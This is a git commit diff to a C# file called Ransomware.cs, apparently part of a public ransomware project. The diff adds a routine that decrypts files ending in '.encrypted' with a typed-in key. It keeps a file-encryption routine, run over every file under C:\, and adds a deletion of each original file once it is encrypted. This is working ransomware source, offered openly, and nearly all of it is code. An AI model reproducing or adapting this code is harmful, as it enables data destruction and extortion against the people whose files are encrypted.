25aaec84b5377d13fc50708508edf348310f0bc1
idk <91932176+SyfonSec@users.noreply.github.com>
2023-04-03 14:12:02 -0700

    Update Ransomware.cs

--- Ransomware.cs
+++ Ransomware.cs
@@ -9,21 +9,22 @@ namespace Ransomware
         static void Main(string[] args)
         {
             string directory = @"C:\";
-            string[] files = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);
+            string[] files = Directory.GetFiles(directory, "*.encrypted", SearchOption.AllDirectories);
+
+            Console.Write("Enter the Decryption Key: ");
+            string password = Console.ReadLine();
 
             foreach (string file in files)
             {
-                EncryptFile(file);
+                DecryptFile(file, password);
             }
-              //The Message You Want
-            Console.WriteLine("Message");
+
+            Console.WriteLine("All Files Have Been Decrypted.");
             Console.ReadLine();
         }
 
-        static void EncryptFile(string inputFile)
+        static void EncryptFile(string inputFile, string password)
         {
-            //The Password You Want
-            string password = "Password-You-Want-Use";
             byte[] salt = GenerateRandomSalt();
 
             byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
@@ -48,6 +49,40 @@ namespace Ransomware
                         {
                             inputStream.CopyTo(cryptoStream);
                         }
+                    }
+                }
+            }
+
+            File.Delete(inputFile);
+        }
+
+        static void DecryptFile(string inputFile, string password)
+        {
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+            byte[] salt = new byte[16];
+            byte[] iv = new byte[16];
+            byte[] fileBytes = File.ReadAllBytes(inputFile);
+
+            Buffer.BlockCopy(fileBytes, 0, salt, 0, salt.Length);
+            Buffer.BlockCopy(fileBytes, salt.Length, iv, 0, iv.Length);
+            byte[] encrypted = new byte[fileBytes.Length - salt.Length - iv.Length];
+
+            Buffer.BlockCopy(fileBytes, salt.Length + iv.Length, encrypted, 0, encrypted.Length);
+
+            byte[] keyBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000).GetBytes(256 / 8);
+
+            using (Aes aes = Aes.Create())
+            {
+                aes.KeySize = 256;
+                aes.Key = keyBytes;
+                aes.IV = iv;
+                aes.Mode = CipherMode.CBC;
+
+                using (FileStream outputStream = File.Create(inputFile.Replace(".encrypted", "")))
+                {
+                    using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
+                    {
+                        cryptoStream.Write(encrypted, 0, encrypted.Length);
                     }
                 }
             }
